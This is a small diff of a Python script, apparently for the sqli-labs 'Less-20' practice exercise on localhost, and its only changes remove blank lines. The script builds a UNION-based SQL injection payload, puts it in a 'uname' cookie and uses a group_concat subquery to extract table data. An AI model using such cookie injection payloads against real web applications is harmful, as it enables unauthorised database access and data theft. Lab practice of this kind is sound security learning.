@@ -6,10 +6,7 @@ get_secret = "(select group_concat({0}) from {1})"
 url = "http://localhost:1234/Less-20/"
 session = requests.Session()
 
-
-
 payload = "' union select 5,{},3#"
-
 
 cookies = {"uname": payload.format(get_table)}
 response = requests.post(url,cookies=cookies)
